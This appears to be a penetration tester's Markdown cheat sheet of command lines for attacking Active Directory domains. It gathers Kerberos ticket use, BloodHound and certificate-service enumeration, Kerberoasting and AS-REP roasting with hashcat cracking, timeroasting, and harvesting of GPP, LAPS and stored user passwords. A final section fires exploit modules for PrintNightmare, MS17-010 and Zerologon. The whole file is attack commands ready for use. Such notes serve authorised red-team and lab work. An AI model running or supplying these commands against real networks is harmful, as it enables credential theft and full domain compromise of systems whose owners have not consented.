# Active Directory
#target/remote #os/linux #cat/ad

## AD all in one
#faketime
```
getTGT.py <domain>/'<user>'<impacket_auth> && export KRB5CCNAME=$(pwd)/'<user>'.ccache

bloodyAD --host <fqdn> -d <domain> -u '<user>' -k get writable

rusthound-ce -z -c All -d <domain> -u '<user>' -k -f <fqdn> -i <dc_ip>

certipy find -vulnerable -u '<user>'@<domain> -k -target <fqdn> -dc-ip <dc_ip> -stdout -timeout 2 -ldap-scheme ldap

nxc ldap <ip> --use-kcache --kerberoasting hashes.kerberoast --find-delegation --trusted-for-delegation --password-not-required --admin-count --pso --pass-pol --gmsa

nxc ldap <ip> --use-kcache -M adcs -M badsuccessor -M dns-nonsecure -M dump-computers -M entra-id -M get-network -M get-scriptpath -M maq -M obsolete -M sccm -M subnets -M tombstone -M whoami

nxc ldap <ip> --use-kcache -M get-desc-users -M get-info-users -M get-unixUserPassword -M get-userPassword -M laps -M pre2k

GetNPUsers.py -request -outputfile hashes.asreproast <domain>/'<user>' -k -no-pass -dc-host <fqdn>

nxc smb <ip> --use-kcache --shares

nxc smb <ip> --use-kcache -M enum_av -M enum_ca -M enum_cve -M gpp_privileges -M ioxidresolver -M sccm-recon6 -M smbghost -M spooler -M webdav -M gpp_autologin -M gpp_password

nxc smb <ip> -u '<user>' -p '<password>' -M nopac -M remove-mic

sh -c '[ -s hashes.asreproast ] && hashcat --runtime 30 hashes.asreproast /usr/share/wordlists/rockyou.txt --force --quiet'

sh -c '[ -s hashes.kerberoast ] && hashcat --runtime 30 hashes.kerberoast /usr/share/wordlists/rockyou.txt --force --quiet'

nxc smb <ip> -u '<user>' -p '<password>' -M timeroast

powerview <domain>/'<user>:<password>'@<dc_fqdn> --no-cache
```

## AD additional user all in one
#faketime
```
getTGT.py <domain>/'<user>'<impacket_auth> && export KRB5CCNAME=$(pwd)/'<user>'.ccache

bloodyAD --host <fqdn> -d <domain> -u '<user>' -k get writable

nxc smb <ip> --use-kcache --shares

certipy find -vulnerable -u '<user>'@<domain> -k -target <fqdn> -dc-ip <dc_ip> -stdout -timeout 2 -ldap-scheme ldap
```

## AD sensitive
```
nxc smb <ip> -u '<user>' -p '<password>' -M printnightmare

nxc smb <ip> -u '<user>' -p '<password>' -M ms17-010 -M zerologon
```
